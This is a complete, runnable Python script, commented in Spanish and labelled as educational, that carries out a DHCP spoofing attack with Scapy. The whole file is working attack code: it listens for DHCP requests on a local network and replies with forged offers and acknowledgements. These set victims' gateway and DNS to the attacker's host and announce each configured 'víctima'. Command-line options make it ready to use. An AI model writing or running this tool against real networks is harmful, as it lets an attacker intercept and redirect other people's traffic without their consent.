#!/usr/bin/env python3
"""
DHCP Spoofing Attack Script - Fines Educativos
Compatible con Scapy 2.5.0 y Python 3
"""

from scapy.all import *
import sys
import argparse

# Configuración del ataque
CONFIG = {
    'server_ip': '192.168.89.16',        # IP del "servidor DHCP" (atacante)
    'gateway_ip': '192.168.89.16',       # Gateway que se asignará a las víctimas
    'dns_servers': ['8.8.8.8'],    # Servidores DNS maliciosos
    'subnet_mask': '255.255.255.0',     # Máscara de subred
    'lease_time': 3600,                 # Tiempo de lease en segundos
    'target_ip': '192.168.89.150',      # IP específica a asignar
    'interface': None                   # Interfaz de red (se define por argumento)
}

def get_dhcp_options(dhcp_options):
    """Extrae opciones DHCP del paquete"""
    options = {}
    for option in dhcp_options:
        if isinstance(option, tuple):
            options[option[0]] = option[1]
    return options

def create_dhcp_offer(discover_packet, client_mac, target_ip):
    """
    Crea un paquete DHCP Offer en respuesta a un DISCOVER
    """
    # Extraer el transaction ID del paquete DISCOVER
    xid = discover_packet[BOOTP].xid
    
    # Crear el paquete Ethernet/IP/UDP
    ether = Ether(dst=client_mac, src=get_if_hwaddr(CONFIG['interface']))
    ip = IP(src=CONFIG['server_ip'], dst='255.255.255.255')
    udp = UDP(sport=67, dport=68)
    
    # Crear el paquete BOOTP
    bootp = BOOTP(
        op=2,                    # 2 = Reply
        htype=1,                 # Ethernet
        hlen=6,                  # Longitud MAC
        hops=0,
        xid=xid,                 # Mismo transaction ID
        secs=0,
        flags=0x8000,           # Broadcast flag
        ciaddr='0.0.0.0',       # Client IP (aún no asignada)
        yiaddr=target_ip,       # Your (client) IP address - LA IP QUE ASIGNAMOS
        siaddr=CONFIG['server_ip'],  # Server IP
        giaddr='0.0.0.0',       # Gateway IP (relay)
        chaddr=bytes.fromhex(client_mac.replace(':', '')) + b'\x00' * 10,  # Client MAC
        sname=b'',              # Server name
        file=b''               # Boot file
    )
    
    # Crear opciones DHCP
    dhcp_options = [
        ('message-type', 'offer'),           # DHCPOFFER
        ('server_id', CONFIG['server_ip']),  # Server identifier
        ('subnet_mask', CONFIG['subnet_mask']),
        ('router', CONFIG['gateway_ip']),    # Default gateway
        ('lease_time', CONFIG['lease_time']),
        ('renewal_time', int(CONFIG['lease_time'] / 2)),
        ('rebinding_time', int(CONFIG['lease_time'] * 0.875)),
    ]
    
    # Agregar servidores DNS
    for dns in CONFIG['dns_servers']:
        dhcp_options.append(('name_server', dns))
    
    dhcp_options.append('end')
    
    dhcp = DHCP(options=dhcp_options)
    
    # Construir el paquete completo
    packet = ether / ip / udp / bootp / dhcp
    
    return packet

def create_dhcp_ack(request_packet, client_mac, target_ip):
    """
    Crea un paquete DHCP ACK en respuesta a un REQUEST
    """
    xid = request_packet[BOOTP].xid
    
    ether = Ether(dst=client_mac, src=get_if_hwaddr(CONFIG['interface']))
    ip = IP(src=CONFIG['server_ip'], dst='255.255.255.255')
    udp = UDP(sport=67, dport=68)
    
    bootp = BOOTP(
        op=2,
        htype=1,
        hlen=6,
        hops=0,
        xid=xid,
        secs=0,
        flags=0x8000,
        ciaddr='0.0.0.0',
        yiaddr=target_ip,
        siaddr=CONFIG['server_ip'],
        giaddr='0.0.0.0',
        chaddr=bytes.fromhex(client_mac.replace(':', '')) + b'\x00' * 10,
        sname=b'',
        file=b''
    )
    
    dhcp_options = [
        ('message-type', 'ack'),             # DHCPACK
        ('server_id', CONFIG['server_ip']),
        ('subnet_mask', CONFIG['subnet_mask']),
        ('router', CONFIG['gateway_ip']),
        ('lease_time', CONFIG['lease_time']),
        ('renewal_time', int(CONFIG['lease_time'] / 2)),
        ('rebinding_time', int(CONFIG['lease_time'] * 0.875)),
    ]
    
    for dns in CONFIG['dns_servers']:
        dhcp_options.append(('name_server', dns))
    
    dhcp_options.append('end')
    
    dhcp = DHCP(options=dhcp_options)
    
    return ether / ip / udp / bootp / dhcp

def handle_dhcp_packet(packet):
    """
    Callback para procesar paquetes DHCP capturados
    """
    if DHCP not in packet:
        return
    
    dhcp_options = get_dhcp_options(packet[DHCP].options)
    message_type = dhcp_options.get('message-type')
    client_mac = packet[Ether].src
    
    # Obtener MAC del cliente desde BOOTP si está disponible
    if BOOTP in packet:
        raw_mac = packet[BOOTP].chaddr[:6]
        client_mac = ':'.join(f'{b:02x}' for b in raw_mac)
    
    print(f"\n[+] Paquete DHCP recibido de {client_mac}")
    print(f"    Tipo de mensaje: {message_type}")
    
    # DHCP DISCOVER - Responder con OFFER
    if message_type == 1:  # discover
        print(f"    [!] Respondiendo DHCPOFFER con IP {CONFIG['target_ip']}")
        
        offer = create_dhcp_offer(packet, client_mac, CONFIG['target_ip'])
        sendp(offer, iface=CONFIG['interface'], verbose=0)
        print(f"    [+] DHCPOFFER enviado")
    
    # DHCP REQUEST - Responder con ACK
    elif message_type == 3:  # request
        requested_ip = dhcp_options.get('requested_addr', 'unknown')
        server_id = dhcp_options.get('server_id', 'unknown')
        
        print(f"    [*] Cliente solicita IP: {requested_ip}")
        print(f"    [*] Server ID en solicitud: {server_id}")
        
        # Solo responder si es para nosotros o si es broadcast
        if server_id == CONFIG['server_ip'] or server_id == 'unknown':
            print(f"    [!] Respondiendo DHCPACK")
            
            ack = create_dhcp_ack(packet, client_mac, CONFIG['target_ip'])
            sendp(ack, iface=CONFIG['interface'], verbose=0)
            print(f"    [+] DHCPACK enviado")
            print(f"\n    *** VÍCTIMA CONFIGURADA ***")
            print(f"    IP Asignada: {CONFIG['target_ip']}")
            print(f"    Gateway: {CONFIG['gateway_ip']}")
            print(f"    DNS: {', '.join(CONFIG['dns_servers'])}")
            print(f"    MAC Víctima: {client_mac}")

def start_spoofing(interface):
    """
    Inicia el sniffer para capturar paquetes DHCP
    """
    CONFIG['interface'] = interface
    
    print("=" * 60)
    print("DHCP Spoofing Attack - Educational Purpose Only")
    print("=" * 60)
    print(f"Interfaz: {interface}")
    print(f"Server IP: {CONFIG['server_ip']}")
    print(f"IP a asignar: {CONFIG['target_ip']}")
    print(f"Gateway malicioso: {CONFIG['gateway_ip']}")
    print(f"DNS malicioso: {', '.join(CONFIG['dns_servers'])}")
    print("=" * 60)
    print("\n[*] Esperando solicitudes DHCP DISCOVER...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    # Filtro BPF para capturar solo paquetes DHCP (puerto 67 o 68)
    # y solo solicitudes del cliente (DISCOVER, REQUEST)
    filter_str = "udp and (port 67 or port 68)"
    
    try:
        sniff(
            iface=interface,
            filter=filter_str,
            prn=handle_dhcp_packet,
            store=0
        )
    except KeyboardInterrupt:
        print("\n\n[*] Deteniendo ataque...")
        print("[*] Saliendo")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description='DHCP Spoofing Attack Script - Educational',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 dhcp_spoof.py -i eth0
  sudo python3 dhcp_spoof.py -i wlan0 --server-ip 192.168.1.100 --target-ip 192.168.1.150
        """
    )
    
    parser.add_argument(
        '-i', '--interface',
        required=True,
        help='Interfaz de red a utilizar (ej: eth0, wlan0)'
    )
    parser.add_argument(
        '--server-ip',
        default=CONFIG['server_ip'],
        help=f'IP del servidor DHCP falso (default: {CONFIG["server_ip"]})'
    )
    parser.add_argument(
        '--target-ip',
        default=CONFIG['target_ip'],
        help=f'IP a asignar a la víctima (default: {CONFIG["target_ip"]})'
    )
    parser.add_argument(
        '--gateway',
        default=CONFIG['gateway_ip'],
        help=f'Gateway a asignar (default: {CONFIG["gateway_ip"]})'
    )
    parser.add_argument(
        '--dns',
        nargs='+',
        default=CONFIG['dns_servers'],
        help=f'Servidores DNS a asignar (default: {" ".join(CONFIG["dns_servers"])})'
    )
    
    args = parser.parse_args()
    
    # Actualizar configuración
    CONFIG['server_ip'] = args.server_ip
    CONFIG['target_ip'] = args.target_ip
    CONFIG['gateway_ip'] = args.gateway
    CONFIG['dns_servers'] = args.dns
    
    # Verificar que se ejecuta como root
    if os.geteuid() != 0:
        print("[-] Error: Este script requiere privilegios de root")
        print("    Ejecuta: sudo python3 dhcp_spoof.py ...")
        sys.exit(1)
    
    start_spoofing(args.interface)

if __name__ == '__main__':
    main()
